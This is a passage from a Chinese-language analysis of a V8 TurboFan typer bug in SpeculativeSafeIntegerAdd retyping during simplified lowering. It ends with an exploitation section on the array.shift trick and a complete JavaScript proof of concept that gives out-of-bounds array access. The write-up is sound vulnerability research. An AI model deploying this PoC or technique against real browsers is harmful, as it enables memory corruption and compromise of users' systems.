        ProcessInput(node, 1, right_use);
        for (int i = 2; i InputCount(); i++) {
          EnqueueInput(node, i);
        }
        SetOutput(node, output, restriction_type);
      }
###  Retype phase
Retype phase进行正向数据流分析，从Start节点开始，对每个节点UpdateFeedbackType更新类型，并将更新后的类型向前传播。
    #45:SpeculativeSafeIntegerAdd[SignedSmall](#41:Phi, #44:NumberConstant, #42:Checkpoint, #38:Merge)  
    [Static type: Range(0, 2147483648), 
    Feedback type: Range(0, 2147483647)]
     visit #45: SpeculativeSafeIntegerAdd
      ==> output kRepWord32
    Type FeedbackTypeOf(Node* node) {
        Type type = GetInfo(node)->feedback_type();
        return type.IsInvalid() ? Type::None() : type;
    }
    ...
    bool UpdateFeedbackType(Node* node) {
    ...
        Type input0_type;
        if (node->InputCount() > 0) input0_type = FeedbackTypeOf(node->InputAt(0));
        Type input1_type;
        if (node->InputCount() > 1) input1_type = FeedbackTypeOf(node->InputAt(1));
        ...
        #define DECLARE_CASE(Name)                                               \
        case IrOpcode::k##Name: {                                              \
            new_type = Type::Intersect(op_typer_.Name(input0_type, input1_type), \
                                    info->restriction_type(), graph_zone());  \
            break;                                                               \
        }
        SIMPLIFIED_SPECULATIVE_NUMBER_BINOP_LIST(DECLARE_CASE)
        SIMPLIFIED_SPECULATIVE_BIGINT_BINOP_LIST(DECLARE_CASE)
    #undef DECLARE_CASE
    ...
        GetInfo(node)->set_feedback_type(new_type);
    ...
    }
    #define SIMPLIFIED_SPECULATIVE_NUMBER_BINOP_LIST(V) \
    ....
      V(SpeculativeNumberBitwiseOr)  
      V(SpeculativeSafeIntegerAdd)                      \
      V(SpeculativeSafeIntegerSubtract)
首先对左值和右值输入节点调用FeedbackTypeOf函数，这个函数会去确定该节点对应的nodeinfo上是否有feedback字段被设置，如果有则代表该输入节点的类型在retype的时候被更新了，需要取该类型作为实际的类型信息，否则代表没有更新，和之前typer阶段分析的一致，直接取原本的type即可，最终得到input0_type和input1_type。
这个宏看上去很不好理解，但其实意思就是对于  
SpeculativeSafeIntegerAdd节点，先根据input0_type和input1_type，重新调用SpeculativeSafeIntegerAdd运算符的type函数，计算出一个类型，其应该是Range(0,
2147483648)。
然后将这个结果和`restriction_type`即Signed32取交集，而Signed32的范围应该是(-2147483648,2147483647)，最终得到Feedback
type是Range(0, 2147483647)，并将这个结果更新到节点对于nodeinfo的feedback_type字段上。
SpeculativeNumberBitwiseOr同理，由于SpeculativeSafeIntegerAdd的类型作为input0_type已经被更新了，所以调用SpeculativeNumberBitwiseOr的type函数将计算出一个新的类型，作为Feedback
type传播下去。
    #47:SpeculativeNumberBitwiseOr[SignedSmall](#45:SpeculativeSafeIntegerAdd, #46:NumberConstant, #45:SpeculativeSafeIntegerAdd, #38:Merge)  
    [Static type: Range(-2147483648, 2147483647), 
    Feedback type: Range(0, 2147483647)]
     visit #47: SpeculativeNumberBitwiseOr
      ==> output kRepWord32
Retype
phase除了调用UpdateFeedbackType更新信息，还会调用VisitNode函数设置节点的respresentation，但这和这个漏洞无关，略过不表。
###  Lower phase
现在，每个节点都已经和它的使用信息(truncation)和output representation关联了。
最后将反向的遍历所有节点，进行lower
  * 将节点本身lower到更具体的节点（通过DeferReplacement）
  * 当该节点的的output representation与此输入的预期使用信息不匹配时，对节点进行转换（插入ConvertInput），比如对于一个representation是kSigned的node1，若其use节点node2会将其truncation到kWord64，则将会插入ConvertInput函数对该节点进行转换。
于是对于poc里的`z InputAt(0));
            Type const rhs_type = TypeOf(node->InputAt(1));
            // Regular number comparisons in JavaScript generally identify zeros,
            // so we always pass kIdentifyZeros for the inputs, and in addition
            // we can truncate -0 to 0 for otherwise Unsigned32 or Signed32 inputs.
            if (lhs_type.Is(Type::Unsigned32OrMinusZero()) &&
                rhs_type.Is(Type::Unsigned32OrMinusZero())) {
              // => unsigned Int32Cmp
              VisitBinop(node, UseInfo::TruncatingWord32(),
                            MachineRepresentation::kBit);
              if (lower()) ChangeOp(node, Uint32Op(node));
            } else if (lhs_type.Is(Type::Signed32OrMinusZero()) &&
                       rhs_type.Is(Type::Signed32OrMinusZero())) {
              // => signed Int32Cmp
              VisitBinop(node, UseInfo::TruncatingWord32(),
                            MachineRepresentation::kBit);
              if (lower()) ChangeOp(node, Int32Op(node));
            } else {
              // => Float64Cmp
              VisitBinop(node, UseInfo::TruncatingFloat64(kIdentifyZeros),
                            MachineRepresentation::kBit);
              if (lower()) ChangeOp(node, Float64Op(node));
            }
            return;
          }
## Exploit
###  array.shift trick
这个漏洞的原理至此已经分析清楚了，那么我们简单的来浏览一下这个漏洞的typer exploit trick。
    //首先假设我们能让l的类型在typer阶段被推断成Range(-1,0)
    let arr = new Array(l);
    arr.shift();
####  TFBytecodeGraphBuilder
####  TFInlining
`#81`也就是array.shift将被Reduce成这些节点，我们重点关注StoreField[+12]即可，因为这代表的是重新为array的length字段赋值。
这部分IR对应的伪代码如下，摘自zer0con PPT原文。
    /* JSCallReducer::ReduceArrayPrototypeShift */
    let length = LoadField(arr, kLengthOffset); if (length == 0) {
        return;
    } 
    else {
        if (length  100 */ {
            CallRuntime(ArrayShift);
        } 
    }
如果关注IR图的话，关注下面这部分就行了，可以看出先LoadField[+12]，然后对其减1，再StoreField[+12]回去。
####  TFTypedLowering
如图就是#JSCreateArray在TypedLowering phase被reduce后的IR。
伪代码如下:
    // JSCreateLowering::ReduceJSCreateArray 
    // JSCreateLowering::ReduceNewArray 
    let limit = kInitialMaxFastElementArray; // limit : NumberConstant[16380]
    // len : Range(-1, 0), real: 1
    let checkedLen = CheckBounds(len, limit); // checkedLen : Range(0, 0), real: 1
    let arr = Allocate(kArraySize); 
    StoreField(arr, k[Map|Prop|Elem]Offset, ...);
    StoreField(arr, kLengthOffset, checkedLen);
####  TFLoadElimination
有趣的是将上面这些reduce后的结果连起来看，会发现对length先Store，再Load，再减去一个-1，再Store，这是不是过于冗杂了呢，v8对其会进行一定的优化。
篇幅所限，略去不表，以后有空我再单独写一篇讲LoadElimination的漏洞的文章，总之最终优化后，首先会直接将`#154
CheckBounds`作为`#133 NumberSubtract`的左值输入。
然后由于之前Typer分析的时候CheckBounds的范围是(0,0)，这显然是一个常量，而`#44`也是一个常量1，所以`#133`在其输入更新后，它的type也被更新成了-1，随后就被常量折叠掉，于是最终得到的IR图如下。
最终伪代码如下:
    let limit = kInitialMaxFastElementArray; // limit : NumberConstant[16380]
    // len : Range(-1, 0), real: 1
    let checkedLen = CheckBounds(len, limit); // checkedLen : Range(0, 0), real: 1
    let arr = Allocate(kArraySize); 
    StoreField(arr, kMapOffset, map); 
    StoreField(arr, kPropertyOffset, property); 
    StoreField(arr, kElementOffset, element);
    StoreField(arr, kLengthOffset, checkedLen);
    let length = checkedLen;
    // length: Range(0, 0), real: 1
    if (length != 0) {
        if (length  100 */ 
        {
            CallRuntime(ArrayShift);
        }
    }
事实上到目前为止一切就比较清晰了，只要我们 **能让length通过CheckBounds的检查，并且其值不等于0且小于等于100**
，就能在`arr.shift`之后让arr的length被置为-1，即0xffffffff，就实现arr的越界读写了。
###  最终的oob poc
    function foo(a) {
      var y = 0x7fffffff;
      if (a == NaN) y = NaN; 
      if (a) y = -1;
      let z = (y + 1) + 0;
      let l = 0 - Math.sign(z);
      let arr = new Array(l);
      arr.shift();
      return arr;
    }
    %PrepareFunctionForOptimization(foo);
    foo(true);
    %OptimizeFunctionOnNextCall(foo);
    print(foo(false).length);
事实上很有趣的一件事情是:
  1. Retype前后的NumberSign的范围都是(0,1)，`let l = 0 - Math.sign(z)`在Retype前后的范围都是(-1,0)，没有变化。
  2. 补丁前后，影响的也只是`let z = (y + 1) + 0`的范围从(0, 2147483647)，变成了(0, 2147483648)，补丁前后不影响NumberSign的范围，所以也不会影响CheckBounds的范围，也就不会影响`array.shift`部分生成的IR。
  * 补丁前:  
  * 补丁后:  
所以无论补丁前还是补丁后，上面`array.shift`部分生成的IR都没有变化。  
那么难道补丁之后，我们还可以执行到`StoreField(arr, kLengthOffset,
-1);`,从而得到OOB吗？毕竟这部分代码都还在，它没有变化。
显然不可能，事实上补丁影响到的是对NumberSign的lower，它会根据以下逻辑来计算出是-1还是1。
    Int32Add...
    if ChangeInt32ToFloat64 ()) {
          if (truncation.IsUsedAsWord32() ||
              !CanOverflowSigned32(node->op(), left_feedback_type,
                                   right_feedback_type, type_cache_,
                                   graph_zone())) {
            ChangeToPureOp(node, Int32Op(node));
          } else {
            ChangeToInt32OverflowOp(node);
          }
        }
注意`truncation.IsUsedAsWord32()`，只要满足这个条件，就会生成Int32Op，而要满足这个条件，目前看`add |
0`或者`add +- 0`这种都可以产生截断到word32。
####  如何产生SpeculativeSafeIntegerAdd节点
事实上如果从poc里去掉下面这句就不会创建出SpeculativeSafeIntegerAdd节点了，这是因为v8的启发式JIT在收集执行信息的时候，在进行add的时候，发现`y
+ 1`始终是进行的SignedSmall的add，所以会创建出SpeculativeSafeIntegerAdd。
如果没有这句，那么显然`y + 1`不可能是在SignedSmall范围内计算了，就会生成NumberAdd节点，也就不会走到存在漏洞的路径。
    if (a) y = -1;// The next condition holds only in the warmup run. It leads to Smi (SignedSmall) feedback being collected for the addition below.
## 参考链接
十分感谢刘耕铭精彩的分享:)
  * 
  * 